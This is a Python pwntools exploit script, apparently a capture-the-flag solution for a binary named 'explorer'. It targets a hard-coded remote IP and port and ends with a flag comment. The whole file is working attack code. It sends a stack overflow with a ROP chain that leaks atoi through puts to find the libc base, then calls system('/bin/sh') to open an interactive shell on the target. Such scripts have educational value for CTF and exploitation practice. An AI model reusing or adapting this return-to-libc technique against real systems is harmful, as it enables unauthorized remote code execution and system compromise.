from pwn import *
import time
import sys
context.clear(arch = 'amd64')

def explorer(DEBUG):
	if DEBUG=="1":
		r = process("./explorer")
		raw_input("debug?")
	elif DEBUG=="2":
		HOST = '125.235.240.168'
		PORT = 27016
		r = remote(HOST,PORT)
	
	read_plt = 0x400610
	atoi_got = 0x161F020
	puts_plt = 0x400640
	main = 0xd40a28 
	pop_rdi_ret = 0x462b47 
	offset_atoi = 0x36E80
	offset_system = 0x45390
	offset_sh = 0x18CD57
	castle_num = 42590
	r.recvuntil("Castle number: ")
	r.send(str(castle_num).ljust(8,"\x00"))
	r.send("nSGDGJV\x00")
	payload = ""
	payload += "A"*0x10
	payload += "B"*8
	payload += p64(pop_rdi_ret)
	payload += p64(atoi_got)
	payload += p64(puts_plt) # put(atoi_got)
	payload += p64(main)
	r.sendline(payload)
	
	r.recvuntil("GET IT?\n")
	res = r.recv(6)
	atoi = u64(res.ljust(8,"\x00"))
	baselibc = atoi - offset_atoi
	system = baselibc + offset_system
	sh = baselibc + offset_sh
	log.info('baselibc: %#x' % baselibc)
	log.info('system: %#x' % system)
	log.info('sh: %#x' % sh)
	log.info('atoi: %#x' % atoi)
	
	r.recvuntil("Castle number: ")
	r.send(str(castle_num).ljust(8,"\x00"))
	r.send("nSGDGJV\x00")
	payload = ""
	payload += "A"*0x10
	payload += "B"*8
	payload += p64(pop_rdi_ret)
	payload += p64(sh)
	payload += p64(system)
	r.sendline(payload)
	
	r.interactive()

explorer(sys.argv[1])
# matesctf{Ahihi_Ohoho_H2+O2=HOHO_You_Found_My_Flag}